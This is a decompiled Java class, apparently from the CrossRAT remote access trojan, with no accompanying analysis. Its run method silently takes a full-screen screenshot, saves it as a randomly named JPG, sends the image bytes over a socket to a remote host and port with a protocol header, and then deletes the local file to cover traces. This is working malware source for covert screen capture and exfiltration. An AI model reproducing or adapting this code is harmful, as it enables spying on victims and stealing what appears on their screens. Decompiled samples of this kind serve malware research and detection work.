package crossrat;

import java.awt.AWTException;
import java.awt.HeadlessException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.RenderedImage;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.Random;
import javax.imageio.ImageIO;

final class j
  extends Thread
{
  private Socket a;
  private String b;
  private int c;
  
  public j(String paramString, int paramInt)
  {
    this.b = paramString;
    this.c = paramInt;
  }
  
  private void a(String paramString1, String paramString2)
  {
    this.a = new Socket(this.b, this.c);
    DataOutputStream localDataOutputStream = new DataOutputStream(this.a.getOutputStream());
    paramString1 = new FileInputStream(paramString1);
    localDataOutputStream.writeBytes(k.g + k.d + k.I + k.d + paramString2 + k.d + "&&&");
    try
    {
      Thread.sleep(2000L);
    }
    catch (Exception localException)
    {
      (paramString2 = localException).printStackTrace();
    }
    paramString2 = new byte['ࠀ'];
    while (paramString1.read(paramString2) > 0) {
      localDataOutputStream.write(paramString2);
    }
    paramString1.close();
    localDataOutputStream.close();
  }
  
  public final void run()
  {
    System.setProperty("java.awt.headless", "false");
    Object localObject1 = null;
    Object localObject2;
    try
    {
      localObject1 = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
    }
    catch (HeadlessException localHeadlessException)
    {
      (localObject2 = localHeadlessException).printStackTrace();
    }
    catch (AWTException localAWTException)
    {
      (localObject2 = localAWTException).printStackTrace();
    }
    int i = (localObject2 = new Random()).nextInt(500000) + 1;
    File localFile = new File(k.K + Integer.toString(i) + ".jpg");
    try
    {
      ImageIO.write((RenderedImage)localObject1, "jpg", localFile);
      localObject1 = Long.valueOf(localFile.length());
      a(localFile.toString(), ((Long)localObject1).toString());
      localFile.delete();
      return;
    }
    catch (IOException localIOException)
    {
      (localObject1 = localIOException).printStackTrace();
    }
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\crossrat\j.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */